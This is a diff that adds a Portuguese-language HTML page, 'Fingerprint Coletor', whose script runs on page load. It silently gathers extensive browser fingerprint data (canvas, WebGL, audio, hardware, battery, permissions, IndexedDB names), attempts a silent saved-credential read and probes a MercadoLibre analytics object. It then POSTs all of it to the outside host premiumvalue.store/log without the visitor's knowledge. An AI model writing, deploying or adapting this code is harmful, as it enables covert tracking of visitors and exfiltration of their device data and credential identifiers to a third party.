@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Fingerprint Coletor</title>
+</head>
+<body>
+  <script>
+    async function coletarFingerprint() {
+      const fp = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        languages: navigator.languages,
+        platform: navigator.platform,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: {
+          width: screen.width,
+          height: screen.height,
+          colorDepth: screen.colorDepth,
+          pixelRatio: window.devicePixelRatio,
+          orientation: screen.orientation?.type
+        },
+        plugins: Array.from(navigator.plugins || []).map(p => p.name),
+        hardware: {
+          memory: navigator.deviceMemory || "unknown",
+          cores: navigator.hardwareConcurrency || "unknown",
+          touch: navigator.maxTouchPoints || 0
+        },
+        cookiesEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        connection: navigator.connection || {},
+        battery: {},
+        bluetooth: 'bluetooth' in navigator,
+        permissions: {},
+        credentials: null,
+        canvasFingerprint: null,
+        webglVendor: {},
+        indexedDB: []
+      };
+
+      try {
+        const battery = await navigator.getBattery();
+        fp.battery = {
+          charging: battery.charging,
+          level: battery.level
+        };
+      } catch {}
+
+      try {
+        const permissionNames = ['camera', 'microphone', 'geolocation', 'notifications'];
+        for (let name of permissionNames) {
+          const status = await navigator.permissions.query({ name });
+          fp.permissions[name] = status.state;
+        }
+      } catch {}
+
+      try {
+        const cred = await navigator.credentials.get({ password: true, mediation: "silent" });
+        if (cred) fp.credentials = { id: cred.id };
+      } catch {}
+
+      try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = "top";
+        ctx.font = "16px Arial";
+        ctx.fillStyle = "#f60";
+        ctx.fillText("🧠 fingerprint", 2, 2);
+        fp.canvasFingerprint = canvas.toDataURL();
+      } catch {}
+
+      try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        const dbgInfo = gl?.getExtension('WEBGL_debug_renderer_info');
+        if (dbgInfo) {
+          fp.webglVendor = {
+            vendor: gl.getParameter(dbgInfo.UNMASKED_VENDOR_WEBGL),
+            renderer: gl.getParameter(dbgInfo.UNMASKED_RENDERER_WEBGL)
+          };
+        }
+      } catch {}
+
+      try {
+        const databases = await indexedDB.databases?.();
+        if (databases) {
+          fp.indexedDB = databases.map(db => ({
+            name: db.name,
+            version: db.version
+          }));
+        }
+      } catch {}
+
+      try {
+        if (window.melidata_namespace) {
+          fp.melidata = {
+            typeof: typeof window.melidata_namespace,
+            keys: Object.keys(window.melidata_namespace || {})
+          };
+        }
+      } catch {}
+
+      try {
+        const context = new OfflineAudioContext(1, 44100, 44100);
+        const osc = context.createOscillator();
+        osc.type = 'triangle';
+        osc.frequency.value = 10000;
+        const compressor = context.createDynamicsCompressor();
+        osc.connect(compressor);
+        compressor.connect(context.destination);
+        osc.start(0);
+        context.startRendering();
+        context.oncomplete = e => {
+          fp.audioFingerprint = Array.from(e.renderedBuffer.getChannelData(0).slice(0, 10));
+          enviarDados(fp);
+        };
+      } catch {
+        enviarDados(fp);
+      }
+    }
+
+    function enviarDados(fp) {
+      fetch("https://premiumvalue.store/log", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          tipo: "fingerprint",
+          fp: fp
+        })
+      });
+    }
+
+    document.addEventListener("DOMContentLoaded", coletarFingerprint);
+  </script>
+</body>
+</html>
